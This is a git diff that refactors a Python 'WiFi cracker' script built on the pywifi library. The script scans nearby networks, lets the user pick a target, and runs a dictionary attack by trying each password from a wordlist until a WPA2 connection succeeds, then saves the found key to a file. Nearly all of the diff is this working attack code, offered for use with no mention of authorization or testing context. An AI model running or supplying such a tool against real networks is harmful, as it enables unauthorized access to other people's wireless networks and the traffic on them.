@@ -1,44 +1,101 @@
-from pywifi import const, PyWiFi, Profile
+from pywifi import PyWiFi, Profile, const
+from functools import partial
 from termcolor import cprint
 from itertools import cycle
-import winsound
+import operator
 import time
+import sys
 import os
 
 
-def beep():
-    winsound.Beep(700, 500)
-    winsound.Beep(1000, 500)
+PASSWORD_LIST_PATH = r"password-list.txt"
+FIGLET = '''\n
+   _____ _               ____
+  / ____(_)             |  __|
+ | (___  _ _ __   __ _  | |__ 
+  \___ \| | '_ \ / _` | |  __|
+  ____) | | | | | (_| |_| |  
+ |_____/|_|_| |_|\__,_(_)_| 
+\n\n'''
 
 
-def scan():
-    interface.scan()
-    for i in range(12):
-        for char in '/-\|':
-            print(f'\r Scanning... {char}', end='')
-            time.sleep(.15)
+class Cracker:
+    is_windows = (sys.platform == 'win32')
+    colors = ['blue', 'red']
 
-    return interface.scan_results()
+    def __init__(self, interface_idx=0):
+        self.wifi = PyWiFi()
+        self.interfaces = self.wifi.interfaces()
+        self.interface = self.interfaces[interface_idx]
 
+        self.colors = iter(cycle(Cracker.colors))
+        self.password_list = []
 
-def test_wifi(ssid, password):
-    interface.disconnect()
-    profile = Profile()
-    profile.ssid = ssid
-    profile.auth = const.AUTH_ALG_OPEN
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)
-    profile.cipher = const.CIPHER_TYPE_CCMP
-    profile.key = password
-    interface.connect(interface.add_network_profile(profile))
-    time.sleep(.7)
+    def crack(self, target):
+        start_time = time.time()
 
-    if interface.status() == const.IFACE_CONNECTED:
-        interface.remove_network_profile(profile)
-        return True
+        for tries, password in enumerate(self.password_list, start=1):
+            color = next(self.colors)
+            cprint(f' Testing: {password}', color=color)
 
-    else:
-        interface.remove_network_profile(profile)
-        return False
+            if self.test_wifi(target, password):
+                delta = time.time() - start_time
+                self.beep()
+                print('\n', format(' ', '-<30'), sep='')
+                cprint(f' PASSWORD: <{password}>', color='green')
+                print(f' {tries} passwords have tested in {delta:.2f}s')
+                print(format(' ', '-<30'))
+
+                return password
+
+    def test_wifi(self, ssid, password):
+        self.interface.disconnect()
+        profile = self.create_temp_profile(ssid, password)
+        self.interface.add_network_profile(profile)
+        self.interface.connect(profile)
+        time.sleep(.7)
+
+        if self.interface.status() == const.IFACE_CONNECTED:
+            self.interface.remove_network_profile(profile)
+            return True
+
+        else:
+            self.interface.remove_network_profile(profile)
+            return False
+
+    @staticmethod
+    def create_temp_profile(ssid, password):
+        profile = Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = password
+        return profile
+
+    def load_password_list(self, passwords):
+        self.password_list = list(filter(lambda x: len(x)>=8, passwords))
+
+    def load_password_list_from_file(self, path):
+        with open(path) as handler:
+            self.load_password_list(handler.read().split('\n'))
+
+    def set_interface(self, idx):
+        self.interface = self.interfaces[idx]
+
+    def scan(self):
+        self.interface.scan()
+        for i in range(12):
+            for char in '/-\|':
+                print(f'\r Scanning... {char}', end='')
+                time.sleep(.15)
+
+        return self.interface.scan_results()
+
+    def beep(self):
+        if self.is_windows:
+            beep()
+
 
 
 def select(items):
@@ -53,12 +110,12 @@ def select(items):
     while True:
         try:
             selected_item = int(selected_item)
-            assert selected_item <= len(items) and selected_item > 0
+            assert 1 <= selected_item <= len(items)
             selected_item -= 1
             break
 
         except AssertionError:
-            print(f'\n "{selected_item}" is not a valid host number')
+            print(f'\n "{selected_item}" is not a valid host index')
             selected_item = input('\n Please enter a valid host: ')
 
         except:
@@ -74,58 +131,44 @@ def select(items):
     return items[selected_item]
 
 
-os.system('cls')
-
-wifi = PyWiFi()
-interface = wifi.interfaces()[0]
-colors = iter(cycle(['blue', 'red']))
-password_list = "password-list.txt"
-
-time.sleep(.5)
-print('\n Welcome to WiFi cracker(written by Sina.f)\n')
-time.sleep(1)
-
-hosts = [host.ssid for host in scan()]
-
-if hosts:
-    target = select(hosts)
-    tests = 0
-    print()
-    
-    with open(os.path.realpath(password_list)) as passlist:
-        for password in passlist.readlines():
-            if len(password) < 8:
-                continue
-
-            color = next(colors)
-            cprint(f' Testing: {password}', color=color)
-            tests += 1
-
-            if test_wifi(target, password):
-                beep()
-                print()
-                print(format(' ', '-<30'))
-                cprint(f' PASSWORD: {password}', color='green')
-                print(f' {tests} Password tested!')
-                print(format(' ', '-<30'))
-                break
-
-else:
-    print('\n\n No WiFi available!\n')
+def print_figlet():
+    for line in FIGLET.splitlines():
+        print(line)
+        time.sleep(.2)
 
 
-figlet = '''\n
-   _____ _                __ 
-  / ____(_)              / _|
- | (___  _ _ __   __ _  | |_ 
-  \___ \| | '_ \ / _` | |  _|
-  ____) | | | | | (_| |_| |  
- |_____/|_|_| |_|\__,_(_)_| 
-\n\n'''
+def beep(duration=500):
+    import winsound
+    winsound.Beep(700, duration)
+    winsound.Beep(1000, duration)
 
-for line in figlet.splitlines():
-    print(line)
-    time.sleep(.2)
 
-time.sleep(1)
-input(' Press <enter> to exit...')
+
+if __name__ == '__main__':
+    os.system('cls')
+
+    cracker = Cracker()
+    cracker.load_password_list_from_file(PASSWORD_LIST_PATH)
+
+    time.sleep(.5)
+    print('\n Welcome to WiFi-Cracker (written by Sina.F)\n')
+    time.sleep(1)
+
+    networks = cracker.scan()
+    hosts = list(map(operator.attrgetter('ssid'), networks))
+
+    if hosts:
+        target = select(hosts)
+        print()
+
+        password = cracker.crack(target)
+        with open('password.txt', 'w') as file_handler:
+            file_handler.write(password)
+
+    else:
+        print('\n\n No WiFi available!\n')
+
+
+    print_figlet()
+    time.sleep(1)
+    input(' Press <enter> to exit...')
